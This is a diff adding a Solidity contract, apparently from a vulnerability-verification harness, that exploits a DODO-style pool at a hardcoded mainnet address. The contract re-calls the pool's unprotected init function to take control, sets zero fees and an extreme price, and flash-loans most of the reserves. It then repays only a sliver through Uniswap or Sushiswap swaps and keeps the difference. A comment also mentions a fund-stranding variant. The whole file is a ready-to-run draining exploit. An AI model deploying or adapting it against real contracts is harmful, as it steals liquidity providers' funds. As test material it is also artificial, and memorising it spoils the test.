@@ -1,0 +1,444 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.20;
+
+interface IERC20Like {
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address to, uint256 amount) external returns (bool);
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+
+interface IDODOCalleeLike {
+    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external;
+}
+
+interface IDVMLike {
+    function init(
+        address maintainer,
+        address baseTokenAddress,
+        address quoteTokenAddress,
+        uint256 lpFeeRate,
+        address mtFeeRateModel,
+        uint256 i,
+        uint256 k,
+        bool isOpenTWAP
+    ) external;
+
+    function _BASE_TOKEN_() external view returns (address);
+    function _QUOTE_TOKEN_() external view returns (address);
+    function _BASE_RESERVE_() external view returns (uint112);
+    function _QUOTE_RESERVE_() external view returns (uint112);
+
+    function querySellBase(address trader, uint256 payBaseAmount)
+        external
+        view
+        returns (uint256 receiveQuoteAmount, uint256 mtFee);
+
+    function querySellQuote(address trader, uint256 payQuoteAmount)
+        external
+        view
+        returns (uint256 receiveBaseAmount, uint256 mtFee);
+
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+}
+
+interface IUniswapV2Router02Like {
+    function getAmountsIn(uint256 amountOut, address[] calldata path) external view returns (uint256[] memory amounts);
+
+    function swapTokensForExactTokens(
+        uint256 amountOut,
+        uint256 amountInMax,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external returns (uint256[] memory amounts);
+}
+
+contract ZeroFeeModel {
+    function getFeeRate(address) external pure returns (uint256) {
+        return 0;
+    }
+}
+
+contract FlawVerifier is IDODOCalleeLike {
+    address internal constant TARGET = 0x051EBD717311350f1684f89335bed4ABd083a2b6;
+    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
+    address internal constant SUSHISWAP_ROUTER = 0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F;
+    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
+    uint256 internal constant MAX_I = 1e36;
+    uint256 internal constant BPS = 10_000;
+
+    enum RouteKind {
+        None,
+        BorrowBase,
+        BorrowQuote
+    }
+
+    struct Plan {
+        RouteKind kind;
+        address router;
+        uint256 borrowAmount;
+        uint256 exactRepayOpposite;
+        uint256 maxBorrowTokenToSell;
+        bool viaWeth;
+        uint256 estimatedProfit;
+    }
+
+    ZeroFeeModel internal immutable zeroFeeModel;
+
+    address internal realizedProfitToken;
+    uint256 internal realizedProfitAmount;
+    bool internal executed;
+
+    constructor() {
+        zeroFeeModel = new ZeroFeeModel();
+    }
+
+    function profitToken() external view returns (address) {
+        return realizedProfitToken;
+    }
+
+    function profitAmount() external view returns (uint256) {
+        return realizedProfitAmount;
+    }
+
+    function executeOnOpportunity() external {
+        if (executed) {
+            return;
+        }
+        executed = true;
+
+        IDVMLike pool = IDVMLike(TARGET);
+        address originalBase = pool._BASE_TOKEN_();
+        address originalQuote = pool._QUOTE_TOKEN_();
+        uint256 baseReserve = uint256(pool._BASE_RESERVE_());
+        uint256 quoteReserve = uint256(pool._QUOTE_RESERVE_());
+
+        // Exploit-path note:
+        // - The "front-run intended initializer" path is only relevant for an uninitialized deployment.
+        //   This verifier targets the provided live mainnet pool address and therefore uses the replay-init path.
+        // - The "repoint to different token addresses and strand funds" path is a separate destructive replay-init
+        //   effect, but it is not used as the profit path here because the harness requires a profit attempt.
+        if (originalBase == address(0) || originalQuote == address(0)) {
+            return;
+        }
+        if (baseReserve == 0 || quoteReserve == 0) {
+            return;
+        }
+
+        Plan memory basePlan = _planBorrowBase(pool, originalBase, originalQuote, baseReserve);
+        Plan memory quotePlan = _planBorrowQuote(pool, originalBase, originalQuote, quoteReserve);
+        Plan memory chosen = basePlan.estimatedProfit >= quotePlan.estimatedProfit ? basePlan : quotePlan;
+        if (chosen.kind == RouteKind.None || chosen.estimatedProfit == 0) {
+            return;
+        }
+
+        if (chosen.kind == RouteKind.BorrowBase) {
+            pool.init(address(this), originalBase, originalQuote, 0, address(zeroFeeModel), 1, 0, false);
+            uint256 beforeBalance = IERC20Like(originalBase).balanceOf(address(this));
+            pool.flashLoan(
+                chosen.borrowAmount,
+                0,
+                address(this),
+                abi.encode(chosen.kind, chosen.router, chosen.viaWeth, chosen.exactRepayOpposite, chosen.maxBorrowTokenToSell)
+            );
+            realizedProfitToken = originalBase;
+            realizedProfitAmount = IERC20Like(originalBase).balanceOf(address(this)) - beforeBalance;
+            return;
+        }
+
+        pool.init(address(this), originalBase, originalQuote, 0, address(zeroFeeModel), MAX_I, 0, false);
+        uint256 beforeBalanceQuote = IERC20Like(originalQuote).balanceOf(address(this));
+        pool.flashLoan(
+            0,
+            chosen.borrowAmount,
+            address(this),
+            abi.encode(chosen.kind, chosen.router, chosen.viaWeth, chosen.exactRepayOpposite, chosen.maxBorrowTokenToSell)
+        );
+        realizedProfitToken = originalQuote;
+        realizedProfitAmount = IERC20Like(originalQuote).balanceOf(address(this)) - beforeBalanceQuote;
+    }
+
+    function DVMFlashLoanCall(address, uint256, uint256, bytes calldata data) external override {
+        require(msg.sender == TARGET, "UNEXPECTED_CALLER");
+
+        (RouteKind kind, address router, bool viaWeth, uint256 exactOppositeOut, uint256 maxInput) = abi.decode(
+            data,
+            (RouteKind, address, bool, uint256, uint256)
+        );
+
+        address base = IDVMLike(TARGET)._BASE_TOKEN_();
+        address quote = IDVMLike(TARGET)._QUOTE_TOKEN_();
+
+        if (kind == RouteKind.BorrowBase) {
+            if (router != address(0)) {
+                _swapTokensForExact(router, base, quote, viaWeth, exactOppositeOut, maxInput);
+            }
+            _safeTransfer(quote, TARGET, exactOppositeOut);
+            return;
+        }
+
+        if (kind == RouteKind.BorrowQuote) {
+            if (router != address(0)) {
+                _swapTokensForExact(router, quote, base, viaWeth, exactOppositeOut, maxInput);
+            }
+            _safeTransfer(base, TARGET, exactOppositeOut);
+        }
+    }
+
+    function _planBorrowBase(
+        IDVMLike pool,
+        address base,
+        address quote,
+        uint256 baseReserve
+    ) internal returns (Plan memory best) {
+        pool.init(address(this), base, quote, 0, address(zeroFeeModel), 1, 0, false);
+
+        uint256[8] memory fractions = [uint256(9900), 9500, 9000, 7500, 5000, 2500, 1000, 100];
+        for (uint256 i = 0; i < fractions.length; ++i) {
+            uint256 borrowAmount = (baseReserve * fractions[i]) / BPS;
+            if (borrowAmount == 0) {
+                continue;
+            }
+
+            uint256 needQuote = _minQuoteForBorrowedBase(pool, borrowAmount);
+            if (needQuote == 0) {
+                continue;
+            }
+
+            uint256 heldQuote = IERC20Like(quote).balanceOf(address(this));
+            if (heldQuote >= needQuote) {
+                if (borrowAmount > best.estimatedProfit) {
+                    best = Plan(RouteKind.BorrowBase, address(0), borrowAmount, needQuote, 0, false, borrowAmount);
+                }
+                continue;
+            }
+
+            (bool ok, address router, bool viaWeth, uint256 spendBase) = _bestSwapInput(base, quote, needQuote);
+            if (!ok || spendBase >= borrowAmount) {
+                continue;
+            }
+
+            uint256 estimatedProfit = borrowAmount - spendBase;
+            if (estimatedProfit > best.estimatedProfit) {
+                best = Plan(RouteKind.BorrowBase, router, borrowAmount, needQuote, spendBase, viaWeth, estimatedProfit);
+            }
+        }
+    }
+
+    function _planBorrowQuote(
+        IDVMLike pool,
+        address base,
+        address quote,
+        uint256 quoteReserve
+    ) internal returns (Plan memory best) {
+        pool.init(address(this), base, quote, 0, address(zeroFeeModel), MAX_I, 0, false);
+
+        uint256[8] memory fractions = [uint256(9900), 9500, 9000, 7500, 5000, 2500, 1000, 100];
+        for (uint256 i = 0; i < fractions.length; ++i) {
+            uint256 borrowAmount = (quoteReserve * fractions[i]) / BPS;
+            if (borrowAmount == 0) {
+                continue;
+            }
+
+            uint256 needBase = _minBaseForBorrowedQuote(pool, borrowAmount);
+            if (needBase == 0) {
+                continue;
+            }
+
+            uint256 heldBase = IERC20Like(base).balanceOf(address(this));
+            if (heldBase >= needBase) {
+                if (borrowAmount > best.estimatedProfit) {
+                    best = Plan(RouteKind.BorrowQuote, address(0), borrowAmount, needBase, 0, false, borrowAmount);
+                }
+                continue;
+            }
+
+            (bool ok, address router, bool viaWeth, uint256 spendQuote) = _bestSwapInput(quote, base, needBase);
+            if (!ok || spendQuote >= borrowAmount) {
+                continue;
+            }
+
+            uint256 estimatedProfit = borrowAmount - spendQuote;
+            if (estimatedProfit > best.estimatedProfit) {
+                best = Plan(RouteKind.BorrowQuote, router, borrowAmount, needBase, spendQuote, viaWeth, estimatedProfit);
+            }
+        }
+    }
+
+    function _minQuoteForBorrowedBase(IDVMLike pool, uint256 borrowedBase) internal view returns (uint256) {
+        uint256 low = 1;
+        uint256 high = 1;
+
+        while (high < type(uint256).max / 2) {
+            (uint256 receiveBase, ) = pool.querySellQuote(address(this), high);
+            if (receiveBase >= borrowedBase) {
+                break;
+            }
+            high <<= 1;
+        }
+
+        (uint256 maxReceive, ) = pool.querySellQuote(address(this), high);
+        if (maxReceive < borrowedBase) {
+            return 0;
+        }
+
+        while (low < high) {
+            uint256 mid = low + ((high - low) >> 1);
+            (uint256 receiveBaseMid, ) = pool.querySellQuote(address(this), mid);
+            if (receiveBaseMid >= borrowedBase) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+        return low;
+    }
+
+    function _minBaseForBorrowedQuote(IDVMLike pool, uint256 borrowedQuote) internal view returns (uint256) {
+        uint256 low = 1;
+        uint256 high = 1;
+
+        while (high < type(uint256).max / 2) {
+            (uint256 receiveQuote, ) = pool.querySellBase(address(this), high);
+            if (receiveQuote >= borrowedQuote) {
+                break;
+            }
+            high <<= 1;
+        }
+
+        (uint256 maxReceive, ) = pool.querySellBase(address(this), high);
+        if (maxReceive < borrowedQuote) {
+            return 0;
+        }
+
+        while (low < high) {
+            uint256 mid = low + ((high - low) >> 1);
+            (uint256 receiveQuoteMid, ) = pool.querySellBase(address(this), mid);
+            if (receiveQuoteMid >= borrowedQuote) {
+                high = mid;
+            } else {
+                low = mid + 1;
+            }
+        }
+        return low;
+    }
+
+    function _bestSwapInput(
+        address tokenIn,
+        address tokenOut,
+        uint256 amountOut
+    ) internal view returns (bool ok, address router, bool viaWeth, uint256 amountIn) {
+        if (tokenIn == tokenOut || amountOut == 0) {
+            return (false, address(0), false, 0);
+        }
+
+        amountIn = type(uint256).max;
+
+        (bool candidateOk, uint256 candidateIn) = _quoteAmountsIn(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountOut, false);
+        if (candidateOk) {
+            ok = true;
+            router = UNISWAP_V2_ROUTER;
+            viaWeth = false;
+            amountIn = candidateIn;
+        }
+
+        (candidateOk, candidateIn) = _quoteAmountsIn(UNISWAP_V2_ROUTER, tokenIn, tokenOut, amountOut, true);
+        if (candidateOk && candidateIn < amountIn) {
+            ok = true;
+            router = UNISWAP_V2_ROUTER;
+            viaWeth = true;
+            amountIn = candidateIn;
+        }
+
+        (candidateOk, candidateIn) = _quoteAmountsIn(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountOut, false);
+        if (candidateOk && candidateIn < amountIn) {
+            ok = true;
+            router = SUSHISWAP_ROUTER;
+            viaWeth = false;
+            amountIn = candidateIn;
+        }
+
+        (candidateOk, candidateIn) = _quoteAmountsIn(SUSHISWAP_ROUTER, tokenIn, tokenOut, amountOut, true);
+        if (candidateOk && candidateIn < amountIn) {
+            ok = true;
+            router = SUSHISWAP_ROUTER;
+            viaWeth = true;
+            amountIn = candidateIn;
+        }
+
+        if (!ok) {
+            amountIn = 0;
+        }
+    }
+
+    function _quoteAmountsIn(
+        address router,
+        address tokenIn,
+        address tokenOut,
+        uint256 amountOut,
+        bool viaWeth
+    ) internal view returns (bool ok, uint256 amountIn) {
+        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
+        try IUniswapV2Router02Like(router).getAmountsIn(amountOut, path) returns (uint256[] memory amounts) {
+            if (amounts.length != path.length || amounts[0] == 0) {
+                return (false, 0);
+            }
+            return (true, amounts[0]);
+        } catch {
+            return (false, 0);
+        }
+    }
+
+    function _swapTokensForExact(
+        address router,
+        address tokenIn,
+        address tokenOut,
+        bool viaWeth,
+        uint256 exactAmountOut,
+        uint256 amountInMax
+    ) internal {
+        address[] memory path = _buildPath(tokenIn, tokenOut, viaWeth);
+        _forceApprove(tokenIn, router, amountInMax);
+        IUniswapV2Router02Like(router).swapTokensForExactTokens(
+            exactAmountOut,
+            amountInMax,
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function _buildPath(address tokenIn, address tokenOut, bool viaWeth) internal pure returns (address[] memory path) {
+        if (!viaWeth || tokenIn == WETH || tokenOut == WETH) {
+            path = new address[](2);
+            path[0] = tokenIn;
+            path[1] = tokenOut;
+            return path;
+        }
+
+        path = new address[](3);
+        path[0] = tokenIn;
+        path[1] = WETH;
+        path[2] = tokenOut;
+    }
+
+    function _forceApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        if (ok && (data.length == 0 || abi.decode(data, (bool)))) {
+            return;
+        }
+
+        _rawApprove(token, spender, 0);
+        _rawApprove(token, spender, amount);
+    }
+
+    function _rawApprove(address token, address spender, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "APPROVE_FAILED");
+    }
+
+    function _safeTransfer(address token, address to, uint256 amount) internal {
+        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
+        require(ok && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FAILED");
+    }
+}
